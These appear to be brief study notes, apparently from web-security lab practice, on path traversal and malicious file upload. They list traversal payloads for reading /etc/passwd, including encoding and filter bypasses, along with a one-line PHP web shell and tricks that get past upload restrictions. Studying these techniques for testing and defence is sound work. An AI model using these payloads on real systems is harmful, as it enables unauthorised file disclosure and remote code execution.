# notes
## **PATH TRAVERSAL**
Default way:

>GET /image?filename=../../../../../../../../etc/passwd

Url-Encoded:

>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Way, when `../` erased:

>....//....//....//....//

When filename should start with some string 

>/var/www/images/../../../../../etc/passwd










## **FILE UPLOAD**
Default way:
><?php echo system($_GET['command']); ?>

Flawed file type validation:
Change content type to image/jpeg

Script execution can be disabled in a separate folder. This can be bypassed with the help of path traversal:
Instead of 
`Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
  We can use
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
  Or obfuscated versions
